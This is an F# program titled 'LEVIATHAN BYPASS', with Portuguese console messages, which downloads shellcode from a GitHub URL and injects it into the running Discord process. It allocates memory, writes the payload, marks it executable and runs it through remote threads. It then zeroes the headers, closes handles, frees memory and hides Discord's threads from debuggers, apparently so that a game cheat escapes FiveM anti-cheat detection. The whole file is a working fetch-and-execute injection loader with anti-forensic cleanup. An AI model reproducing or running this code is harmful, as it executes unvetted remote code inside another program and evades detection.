open System
open System.Runtime.InteropServices
open System.Diagnostics
open System.Threading
open System.Net
open System.Net.Http

let PROCESS_ALL_ACCESS = 0x1FFFFFu
let PROCESS_DUP_HANDLE = 0x0040u
let PROCESS_QUERY_INFORMATION = 0x0400u
let MEM_COMMIT = 0x1000u
let MEM_RESERVE = 0x2000u
let PAGE_READWRITE = 0x04u
let PAGE_EXECUTE_READ = 0x20u
let THREAD_ACCESS = 0x0010u ||| 0x0002u ||| 0x0040u ||| 0x0008u
let VK_SHIFT = 0x10
let VK_F1 = 0x70
let VK_F2 = 0x71
let VK_F3 = 0x72
let SystemHandleInformation = 16u

[<Struct; StructLayout(LayoutKind.Sequential)>]
type SYSTEM_HANDLE_TABLE_ENTRY_INFO =
    val mutable UniqueProcessId: uint16
    val mutable CreatorBackTraceIndex: uint16
    val mutable ObjectTypeIndex: uint8
    val mutable HandleAttributes: uint8
    val mutable HandleValue: uint16
    val mutable Object_: IntPtr
    val mutable GrantedAccess: uint32

[<Struct; StructLayout(LayoutKind.Sequential)>]
type THREADENTRY32 =
    val mutable dwSize: uint32
    val mutable cntUsage: uint32
    val mutable th32ThreadID: uint32
    val mutable th32OwnerProcessID: uint32
    val mutable tpBasePri: int32
    val mutable tpDeltaPri: int32
    val mutable dwFlags: uint32
    new(init: unit) = {
        dwSize = uint32(Marshal.SizeOf(typeof<THREADENTRY32>))
        cntUsage = 0u
        th32ThreadID = 0u
        th32OwnerProcessID = 0u
        tpBasePri = 0
        tpDeltaPri = 0
        dwFlags = 0u
    }

[<DllImport("ntdll.dll")>]
extern int NtQuerySystemInformation(uint32, IntPtr, uint32, uint32&)
[<DllImport("ntdll.dll")>]
extern int NtClose(IntPtr)
[<DllImport("ntdll.dll")>]
extern int NtTerminateThread(IntPtr, uint32)
[<DllImport("ntdll.dll")>]
extern int NtSetInformationThread(IntPtr, uint32, IntPtr, uint32)
[<DllImport("ntdll.dll")>]
extern int NtAllocateVirtualMemory(IntPtr, IntPtr&, UIntPtr, uint32&, uint32, uint32)
[<DllImport("ntdll.dll")>]
extern int NtWriteVirtualMemory(IntPtr, IntPtr, byte[], uint32, uint32&)
[<DllImport("ntdll.dll")>]
extern int NtProtectVirtualMemory(IntPtr, IntPtr&, uint32&, uint32, uint32&)
[<DllImport("ntdll.dll")>]
extern int NtFreeVirtualMemory(IntPtr, IntPtr&, uint32&, uint32)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr OpenProcess(uint32, bool, uint32)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool CloseHandle(IntPtr)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr VirtualAllocEx(IntPtr, IntPtr, uint32, uint32, uint32)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool WriteProcessMemory(IntPtr, IntPtr, byte[], uint32, uint32&)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool VirtualProtectEx(IntPtr, IntPtr, uint32, uint32, uint32&)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr CreateRemoteThread(IntPtr, IntPtr, uint32, IntPtr, IntPtr, uint32, IntPtr)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr GetProcAddress(IntPtr, string)
[<DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)>]
extern IntPtr LoadLibraryA(string)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr CreateToolhelp32Snapshot(uint32, uint32)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool Thread32First(IntPtr, THREADENTRY32&)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool Thread32Next(IntPtr, THREADENTRY32&)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr OpenThread(uint32, bool, uint32)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool SetThreadPriority(IntPtr, int)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern uint32 SuspendThread(IntPtr)
[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool Beep(uint32, uint32)
[<DllImport("user32.dll")>]
extern int16 GetAsyncKeyState(int)

let Log (msg: string) = Console.WriteLine(sprintf "  [*] %s" msg)
let LogOk (msg: string) = Console.WriteLine(sprintf "  [+] %s" msg)
let LogWarn (msg: string) = Console.WriteLine(sprintf "  [!] %s" msg)

let DownloadPayload (url: string) =
    let u = url.Replace("/blob/", "/raw/refs/heads/")
    use h = new HttpClientHandler(UseProxy = false)
    use c = new HttpClient(h, Timeout = TimeSpan.FromSeconds(60.0))
    c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
    let d = c.GetByteArrayAsync(u).Result
    d

let Countdown (seconds: int) =
    for i in seconds .. -1 .. 1 do
        Console.Write(sprintf "\r  [*] Aguarde %d segundos... " i)
        Thread.Sleep(1000)
    Console.WriteLine("\r  [+] Pronto! Pode apertar INSERT!                    ")

let DoInject (pid: uint32) (shellcode: byte[]) =
    let hp = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
    if hp = IntPtr.Zero then failwith "Admin"
    let hKernel32 = LoadLibraryA("kernel32.dll")
    let pSleep = GetProcAddress(hKernel32, "Sleep")
    let sb = [|0x48uy;0xC7uy;0xC1uy;0xFFuy;0xFFuy;0xFFuy;0xFFuy;0xFFuy;0x15uy;0x02uy;0x00uy;0x00uy;0x00uy;0xEBuy;0xF7uy|]
    let sw = Array.zeroCreate<byte> (sb.Length + 8)
    Array.Copy(sb, sw, sb.Length)
    Array.Copy(BitConverter.GetBytes(pSleep.ToInt64()), 0, sw, sb.Length, 8)
    let mutable sa = IntPtr.Zero
    let mutable ss = 4096u
    NtAllocateVirtualMemory(hp, &sa, UIntPtr.Zero, &ss, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
    let mutable w = 0u
    NtWriteVirtualMemory(hp, sa, sw, uint32(sw.Length), &w) |> ignore
    let mutable op = 0u
    NtProtectVirtualMemory(hp, &sa, &ss, PAGE_EXECUTE_READ, &op) |> ignore
    let hStub = CreateRemoteThread(hp, IntPtr.Zero, 0u, sa, IntPtr.Zero, 0u, IntPtr.Zero)
    LogOk "[STUB] Criada"
    let mutable a = IntPtr.Zero
    let mutable z = uint32(shellcode.Length + 0x1000)
    NtAllocateVirtualMemory(hp, &a, UIntPtr.Zero, &z, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
    LogOk (sprintf "[ALLOC] 0x%X" (a.ToInt64()))
    let mutable off = 0
    while off < shellcode.Length do
        let sz = min 512 (shellcode.Length - off)
        let ch = Array.zeroCreate<byte> sz
        Array.Copy(shellcode, off, ch, 0, sz)
        let mutable w2 = 0u
        NtWriteVirtualMemory(hp, IntPtr(a.ToInt64() + int64(off)), ch, uint32(sz), &w2) |> ignore
        off <- off + sz
    LogOk (sprintf "[WRITE] %d bytes" shellcode.Length)
    let mutable pa = a
    let mutable ps = uint32(shellcode.Length)
    NtProtectVirtualMemory(hp, &pa, &ps, PAGE_EXECUTE_READ, &op) |> ignore
    LogOk "[PROTECT] RX"
    let hCheat = CreateRemoteThread(hp, IntPtr.Zero, 0u, a, IntPtr.Zero, 0u, IntPtr.Zero)
    LogOk "[EXEC] Cheat rodando!"
    Thread.Sleep(1000)
    let mutable cw = 0u
    NtWriteVirtualMemory(hp, a, Array.zeroCreate<byte> 4096, 4096u, &cw) |> ignore
    LogOk "[CLEAN] Headers zerados"
    hp, a, sa, hStub, hCheat

let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =
    Console.WriteLine("")
    Console.ForegroundColor <- ConsoleColor.Yellow
    Console.WriteLine("  [+] [Shift+F2] LIMPANDO VESTIGIOS...")
    Console.ResetColor()
    let names = [|"Fivem"; "FiveM"; "GTA5"|]
    for name in names do
        if Process.GetProcessesByName(name).Length > 0 then
            let hd = OpenProcess(PROCESS_DUP_HANDLE ||| PROCESS_QUERY_INFORMATION, false, pid)
            if hd <> IntPtr.Zero then
                let mutable size = 0x200000u
                let mutable buffer = Marshal.AllocHGlobal(int size)
                let mutable needed = 0u
                let mutable status = NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)
                while status <> 0 do
                    Marshal.FreeHGlobal(buffer)
                    size <- size * 2u
                    buffer <- Marshal.AllocHGlobal(int size)
                    status <- NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)
                let nh = Marshal.ReadInt32(buffer)
                let hes = Marshal.SizeOf<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()
                let hp2 = IntPtr(buffer.ToInt64() + 8L)
                for i in 0 .. int(nh) - 1 do
                    let ep = IntPtr(hp2.ToInt64() + int64(i * hes))
                    let e = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(ep)
                    if uint32(e.UniqueProcessId) = pid && e.ObjectTypeIndex = 0x7uy then
                        NtClose(IntPtr(int(e.HandleValue))) |> ignore
                Marshal.FreeHGlobal(buffer)
                CloseHandle(hd) |> ignore
    LogOk "[CLEAN] Handles fechadas"
    let mutable ra = addr
    let mutable rs = 0x10000u
    NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore
    let mutable sr = stubAddr
    let mutable sz = 4096u
    NtFreeVirtualMemory(hp, &sr, &sz, 0x8000u) |> ignore
    LogOk "[CLEAN] Memoria liberada"
    let procs = Process.GetProcessesByName("Discord")
    if procs.Length > 0 then
        for t in procs.[0].Threads do
            let ht = OpenThread(THREAD_ACCESS, false, uint32(t.Id))
            if ht <> IntPtr.Zero then
                NtSetInformationThread(ht, 0x11u, IntPtr.Zero, 0u) |> ignore
                SetThreadPriority(ht, -15) |> ignore
                CloseHandle(ht) |> ignore
    LogOk "[CLEAN] Threads ocultadas"
    CloseHandle(hp) |> ignore
    Console.ForegroundColor <- ConsoleColor.Yellow
    Console.WriteLine("  [+] [Shift+F2] LIMPEZA COMPLETA!")
    Console.ResetColor()
    Beep(800u, 150u) |> ignore
    Beep(1000u, 150u) |> ignore
    Beep(1200u, 150u) |> ignore
    Beep(1500u, 300u) |> ignore

let KillCheat (hStub: IntPtr) (hCheat: IntPtr) =
    Console.WriteLine("")
    Console.ForegroundColor <- ConsoleColor.Cyan
    Console.WriteLine("  [+] [Shift+F3] FECHANDO CHEAT...")
    Console.ResetColor()
    if hCheat <> IntPtr.Zero then
        SuspendThread(hCheat) |> ignore
        NtTerminateThread(hCheat, 0u) |> ignore
        CloseHandle(hCheat) |> ignore
    if hStub <> IntPtr.Zero then
        SuspendThread(hStub) |> ignore
        NtTerminateThread(hStub, 0u) |> ignore
        CloseHandle(hStub) |> ignore
    Console.ForegroundColor <- ConsoleColor.Cyan
    Console.WriteLine("  [+] [Shift+F3] CHEAT FECHADO!")
    Console.ResetColor()
    Beep(600u, 200u) |> ignore
    Beep(400u, 400u) |> ignore

Console.Clear()
Console.ForegroundColor <- ConsoleColor.Magenta
Console.WriteLine("")
Console.WriteLine("  LEVIATHAN BYPASS")
Console.WriteLine("  ====================")
Console.WriteLine("")
Console.ForegroundColor <- ConsoleColor.DarkGray
Console.WriteLine("  [+] Shift+F1 = INJECT")
Console.WriteLine("  [+] Shift+F2 = CLEAN (zerar vestigios)")
Console.WriteLine("  [+] Shift+F3 = UNLOAD (fechar cheat)")
Console.WriteLine("")
Console.ForegroundColor <- ConsoleColor.Yellow
Console.WriteLine("  [!] Discord ABERTO - NAO use UNLOAD pelo cheat")
Console.WriteLine("  [!] Apos injetar, aguarde o countdown!")
Console.ResetColor()
Console.WriteLine("")

let PAYLOAD_URL = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/pyayload.bin"
let shellcode = DownloadPayload PAYLOAD_URL
Console.ForegroundColor <- ConsoleColor.Green
Console.WriteLine(sprintf "  [+] Payload: %d bytes" shellcode.Length)
Console.ResetColor()

let procs = Process.GetProcessesByName("Discord")
if procs.Length = 0 then
    Console.ForegroundColor <- ConsoleColor.Red
    Console.WriteLine("  [-] Discord nao encontrado!")
    Console.ResetColor()
    Environment.Exit(1)
let pid = uint32(procs.[0].Id)
Console.ForegroundColor <- ConsoleColor.Green
Console.WriteLine(sprintf "  [+] Discord: PID=%d" pid)
Console.ResetColor()

let mutable hp = IntPtr.Zero
let mutable addr = IntPtr.Zero
let mutable stubAddr = IntPtr.Zero
let mutable hStub = IntPtr.Zero
let mutable hCheat = IntPtr.Zero
let mutable running = true

while running do
    let s = GetAsyncKeyState(VK_SHIFT) &&& 0x8000s <> 0s
    let f1 = GetAsyncKeyState(VK_F1) &&& 0x8000s <> 0s
    let f2 = GetAsyncKeyState(VK_F2) &&& 0x8000s <> 0s
    let f3 = GetAsyncKeyState(VK_F3) &&& 0x8000s <> 0s
    if s && f1 && hp = IntPtr.Zero then
        Console.ForegroundColor <- ConsoleColor.Green
        Console.WriteLine("  [+] [Shift+F1] INJETANDO...")
        Console.ResetColor()
        let h, a, sa, hs, hc = DoInject pid shellcode
        hp <- h
        addr <- a
        stubAddr <- sa
        hStub <- hs
        hCheat <- hc
        Console.ForegroundColor <- ConsoleColor.Green
        Console.WriteLine("  [+] [Shift+F1] INJETADO!")
        Console.ResetColor()
        Countdown(8)
        Beep(1000u, 100u) |> ignore
        Beep(1500u, 100u) |> ignore
        Beep(2000u, 100u) |> ignore
    elif s && f2 && hp <> IntPtr.Zero then
        FullCleanup pid addr stubAddr hp
    elif s && f3 && hCheat <> IntPtr.Zero then
        KillCheat hStub hCheat
    Thread.Sleep(100)
;;
